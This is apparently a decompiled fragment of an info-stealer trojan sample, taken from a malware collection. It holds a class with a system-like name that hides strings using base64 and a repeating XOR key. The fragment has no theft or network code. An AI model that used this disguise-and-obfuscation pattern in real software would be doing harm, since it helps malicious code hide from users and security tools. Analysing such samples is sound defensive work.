// Decompiled with JetBrains decompiler
// Type: SystemNetSSPIWrapperX
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using System;
using System.Text;

public static class SystemNetSSPIWrapperX
{
  public static string Xor(string input, string stringKey)
  {
    StringBuilder stringBuilder = new StringBuilder();
    for (int index = 0; index < input.Length; ++index)
    {
      int utf32 = (int) input[index] ^ (int) stringKey[index % stringKey.Length];
      stringBuilder.AppendFormat("{0}", (object) char.ConvertFromUtf32(utf32));
    }
    return stringBuilder.ToString();
  }

  private static string FromBase64(string base64str) => SystemNetSSPIWrapperX.BytesToStringConverted(Convert.FromBase64CharArray(base64str.ToCharArray(), 0, base64str.Length));

  private static string BytesToStringConverted(byte[] bytes) => Encoding.UTF8.GetString(bytes);

  public static string Read(string b64, string stringKey)
  {
    try
    {
      return string.IsNullOrWhiteSpace(b64) ? string.Empty : SystemNetSSPIWrapperX.FromBase64(SystemNetSSPIWrapperX.Xor(SystemNetSSPIWrapperX.FromBase64(b64), stringKey));
    }
    catch
    {
      return b64;
    }
  }
}
